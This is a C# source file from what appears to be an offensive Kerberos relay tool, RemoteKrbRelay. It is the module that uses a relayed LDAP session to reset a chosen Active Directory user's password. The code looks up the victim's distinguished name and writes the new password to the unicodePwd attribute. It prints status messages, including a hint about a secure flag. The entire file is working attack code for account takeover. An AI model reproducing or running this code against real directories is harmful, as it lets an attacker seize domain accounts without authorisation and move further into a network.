using System;
using System.Text;
using static RemoteKrbRelay.Helpers.Natives;

namespace RemoteKrbRelay.Relay.Attacks.Ldap
{
    internal class ChangePassword
    {
        public static LdapStatus attack(IntPtr ld, string user, string password)
        {
            var dn = Options.victimDN;
            if (string.IsNullOrEmpty(dn))
            {
                dn = Generic.getPropertyValue(ld, user, "distinguishedName");
                if (string.IsNullOrEmpty(dn))
                {
                    Console.WriteLine($"[-] Cant find DN of user {user}. U can specify dn via --victimdn");
                    return LdapStatus.LDAP_NO_SUCH_OBJECT;
                }
            }
            Console.WriteLine($"[!] Setting password {password} on {dn}");
            
            if (!Options.useSSL)
            {
                Console.WriteLine("[?] It may be necessary to run the tool with the -secure flag");
            }

            return (RemoteKrbRelay.Helpers.Natives.LdapStatus)Generic.setAttribute(ld, "unicodePwd", Encoding.Unicode.GetBytes('"' + password + '"'), dn);
        }
    }
}
